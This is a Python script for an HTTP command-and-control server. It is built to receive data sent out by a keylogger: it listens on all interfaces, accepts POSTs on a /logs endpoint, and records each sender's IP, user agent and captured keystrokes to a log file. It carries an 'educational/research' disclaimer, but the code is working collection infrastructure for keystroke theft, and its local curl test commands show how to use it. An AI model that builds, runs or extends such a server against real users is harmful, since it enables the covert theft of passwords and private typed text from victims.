#!/usr/bin/env python3
"""
HTTP C2 Test Server for Keylogger Data Reception
Port: 25566
Receives HTTP POST requests and logs all data.
For Educational/Research Purposes Only!
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
import datetime
import sys
import json

PORT = 25566  # Updated port
LOG_FILE = "keylogger_http_data_25566.txt"

class C2RequestHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        """Handle POST requests from keylogger."""
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length).decode('utf-8', errors='ignore')

        # Meta data
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        client_ip = self.client_address[0]

        # Console output with color
        print(f"\n\033[92m[+] [{timestamp}] POST from {client_ip}\033[0m")
        print(f"    Path: \033[94m{self.path}\033[0m")
        print(f"    Size: \033[93m{len(post_data)} bytes\033[0m")
        print(f"    User-Agent: {self.headers.get('User-Agent', 'Unknown')}")
        print(f"    \033[96mData:\033[0m")

        # Print data (truncate if too long)
        if len(post_data) > 500:
            print(f"    {post_data[:500]}...")
            print(f"    \033[91m[TRUNCATED - see log file for full data]\033[0m")
        else:
            print(f"    {post_data}")

        # Append to log file
        with open(LOG_FILE, 'a', encoding='utf-8') as f:
            f.write(f"\n{'='*70}\n")
            f.write(f"Timestamp: {timestamp}\n")
            f.write(f"Client IP: {client_ip}\n")
            f.write(f"Path: {self.path}\n")
            f.write(f"User-Agent: {self.headers.get('User-Agent', 'Unknown')}\n")
            f.write(f"Content-Type: {self.headers.get('Content-Type', 'Unknown')}\n")
            f.write(f"Content-Length: {content_length}\n")
            f.write(f"{'='*70}\n")
            f.write(post_data)
            f.write("\n\n")

        # Respond to client
        self.send_response(200)
        self.send_header('Content-Type', 'text/plain')
        self.send_header('Server', 'C2-Server/1.0')
        self.end_headers()
        self.wfile.write(b'OK')

    def do_GET(self):
        """Allow for healthcheck GET requests."""
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        client_ip = self.client_address[0]

        print(f"\n\033[93m[*] [{timestamp}] GET {self.path} from {client_ip}\033[0m")

        # Provide status page
        response = f"""HTTP C2 Server Status
========================
Server Time: {timestamp}
Port: {PORT}
Log File: {LOG_FILE}
Status: Active
Client: {client_ip}

POST endpoint: http://localhost:{PORT}/logs
"""

        self.send_response(200)
        self.send_header('Content-Type', 'text/plain')
        self.end_headers()
        self.wfile.write(response.encode())

    def log_message(self, format, *args):
        # Silence default HTTP logging (we do our own)
        return


def test_server():
    """Test the server with a sample POST"""
    import urllib.request
    import urllib.parse

    print("\n\033[96m[TEST] Sending test POST...\033[0m")
    try:
        test_data = "[TEST] This is a test message from the server"
        data = urllib.parse.urlencode({'data': test_data}).encode()
        req = urllib.request.Request(f"http://localhost:{PORT}/logs", data=data)
        response = urllib.request.urlopen(req, timeout=5)
        print(f"\033[92m[TEST] Success! Server responded: {response.read().decode()}\033[0m")
    except Exception as e:
        print(f"\033[91m[TEST] Failed: {e}\033[0m")


def main():
    server_port = PORT

    # Allow custom port via command line
    if len(sys.argv) > 1:
        try:
            server_port = int(sys.argv[1])
        except ValueError:
            print("\033[91mUsage: python3 http_c2_server_test.py [PORT]\033[0m")
            sys.exit(1)

    # Bind to all interfaces
    server_address = ("0.0.0.0", server_port)
    httpd = HTTPServer(server_address, C2RequestHandler)

    # Banner
    print("\033[95m" + "="*70 + "\033[0m")
    print("\033[1;95m       HTTP C2 Test Server - Keylogger Data Receiver\033[0m")
    print("\033[95m" + "="*70 + "\033[0m")
    print(f"\n\033[92m[*] Server started successfully!\033[0m")
    print(f"\033[96m[*] Listening on: 0.0.0.0:{server_port}\033[0m")
    print(f"\033[96m[*] Log file: {LOG_FILE}\033[0m")
    print(f"\n\033[93m[*] Endpoints:\033[0m")
    print(f"    POST: http://localhost:{server_port}/logs")
    print(f"    GET:  http://localhost:{server_port}/ (status check)")
    print(f"\n\033[93m[*] Test the server:\033[0m")
    print(f"    curl -X POST http://localhost:{server_port}/logs -d \"test data\"")
    print(f"    curl http://localhost:{server_port}/")
    print(f"\n\033[91m[*] Press Ctrl+C to stop\033[0m")
    print("\033[95m" + "="*70 + "\033[0m\n")

    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        print("\n\n\033[93m[!] Shutting down server...\033[0m")
        httpd.shutdown()
        print("\033[92m[*] Server stopped.\033[0m")
        print(f"\033[96m[*] Log file saved: {LOG_FILE}\033[0m")


if __name__ == "__main__":
    main()